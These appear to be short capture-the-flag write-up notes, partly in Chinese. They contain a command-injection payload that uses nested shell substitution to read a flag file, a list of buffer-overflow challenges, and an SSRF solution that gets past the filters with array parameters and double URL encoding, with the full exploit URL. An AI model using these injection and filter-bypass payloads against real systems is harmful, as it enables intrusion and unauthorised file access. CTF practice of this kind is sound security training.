# isc.taiwan-te.ch
## ls
```bash
$(echo > /tmp/$(tail /$(echo fl)$(echo ag)); echo /tmp)
```


## pwns
  - pwntools
  - bof
  - bof2
  - ret2sc
  see github source code 
  避免分散發出封包
  `context.log_level ='debug'`

## jssrf
1. [see source code](http://140.118.126.237:8889/source)
2. 本網頁透過`3000`作為公開端口，並且透過該端口接收api，之後過濾輸入內容之後傳到內部端口`3333`。
3. 過濾器`限制長度`與`../`，前者透過path[]繞過，後者透過兩次編碼繞過
4. 得到flag的emoji，一樣兩次編碼繞過第二個過濾器得出結果
5. [get flag](http://140.118.126.237:8889/?path[]=.%252e/flag?tok%25%36%35n=SUP3R_S3CR3T_T0K3N)
